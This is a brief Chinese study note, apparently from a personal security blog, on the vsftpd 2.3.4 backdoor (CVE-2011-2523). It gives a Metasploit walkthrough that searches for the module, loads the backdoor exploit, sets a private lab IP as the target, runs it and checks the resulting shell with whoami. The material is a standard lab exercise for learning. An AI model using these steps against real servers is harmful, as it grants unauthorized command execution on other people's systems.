---
layout: default
title: vsftpd笑脸漏洞
---

# 什么是vsftpd笑脸漏洞

> * 是vsftpd Compromised Source Packages Backdoor Vulnerability
> 
> * 是vsftpd应用2.3.4分支版本被人恶意修改，植入后门
> 
> * CVE-2011-2523

# vsftpd笑脸漏洞nday利用

```bash
search vsftpd
  0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
use 1
set rhosts 172.20.0.8
show options
run
whoami # 显示当前用户，无提示状态显示
```


